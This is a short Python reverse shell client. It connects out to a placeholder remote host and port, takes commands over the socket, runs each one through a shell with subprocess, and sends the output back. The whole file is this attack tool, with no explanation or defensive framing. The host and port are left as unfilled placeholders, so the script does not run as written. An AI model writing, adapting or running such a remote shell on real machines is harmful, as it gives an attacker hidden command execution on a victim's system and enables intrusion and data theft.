import socket
import subprocess

REMOTE_HOST = 'IP'
REMOTE_PORT = port 
client = socket.socket()
print("[-] Connection Initiating...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated!")

while True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE , close_fds=True)
    stdout, stderr = op.communicate()
    print("[-] Sending response...")
    client.send(stdout + stderr)